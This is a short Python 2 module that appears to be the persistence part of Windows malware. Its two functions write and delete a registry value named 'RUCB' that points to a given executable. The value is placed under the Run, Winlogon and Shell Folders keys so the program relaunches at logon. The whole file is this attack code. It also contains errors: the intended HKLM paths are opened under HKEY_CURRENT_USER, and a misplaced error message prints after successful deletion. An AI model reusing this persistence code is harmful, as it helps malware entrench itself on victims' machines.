import os
from _winreg import *

HCU_RUN = r"Software\Microsoft\Windows\CurrentVersion\Run"
HLM_WL = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
HLM_SF = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
HLM_USF = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"

def addRegistery(new_file_path):
    try:
        print '[*] Adding keys to the registry'
        addkey_HCU_RUN = OpenKey(HKEY_CURRENT_USER, HCU_RUN, 0, KEY_ALL_ACCESS)
        addkey_HLM_WL = OpenKey(HKEY_CURRENT_USER, HLM_WL, 0, KEY_ALL_ACCESS)
        addkey_HLM_SF = OpenKey(HKEY_CURRENT_USER, HLM_SF, 0, KEY_ALL_ACCESS)
        addkey_HLM_USF = OpenKey(HKEY_CURRENT_USER, HLM_USF, 0, KEY_ALL_ACCESS)
        
        SetValueEx(addkey_HCU_RUN, "RUCB", 0, REG_SZ, new_file_path)
        SetValueEx(addkey_HLM_WL, "RUCB", 0, REG_SZ, new_file_path)
        SetValueEx(addkey_HLM_SF, "RUCB", 0, REG_SZ, new_file_path)
        SetValueEx(addkey_HLM_USF, "RUCB", 0, REG_SZ, new_file_path)
        
        CloseKey(addkey_HCU_RUN)
        CloseKey(addkey_HLM_WL)
        CloseKey(addkey_HLM_SF)
        CloseKey(addkey_HLM_USF)
        print '[*] Keys Added'
    except Exception as e:
        print '==> Error in add_to_registry function'
        print e
    
def deleteRegistery():    
    try:
        print '[*] Removed keys to the registry'
        addkey_HCU_RUN = OpenKey(HKEY_CURRENT_USER, HCU_RUN, 0, KEY_ALL_ACCESS)
        addkey_HLM_WL = OpenKey(HKEY_CURRENT_USER, HLM_WL, 0, KEY_ALL_ACCESS)
        addkey_HLM_SF = OpenKey(HKEY_CURRENT_USER, HLM_SF, 0, KEY_ALL_ACCESS)
        addkey_HLM_USF = OpenKey(HKEY_CURRENT_USER, HLM_USF, 0, KEY_ALL_ACCESS)

        DeleteValue(addkey_HCU_RUN, "RUCB")
        DeleteValue(addkey_HLM_WL, "RUCB")
        DeleteValue(addkey_HLM_SF, "RUCB")
        DeleteValue(addkey_HLM_USF, "RUCB")
        
        CloseKey(addkey_HCU_RUN)
        CloseKey(addkey_HLM_WL)
        CloseKey(addkey_HLM_SF)
        CloseKey(addkey_HLM_USF)
        print '[*] Keys removed'
        print '==> Error in add_to_registry function'
    except Exception as e:
        print e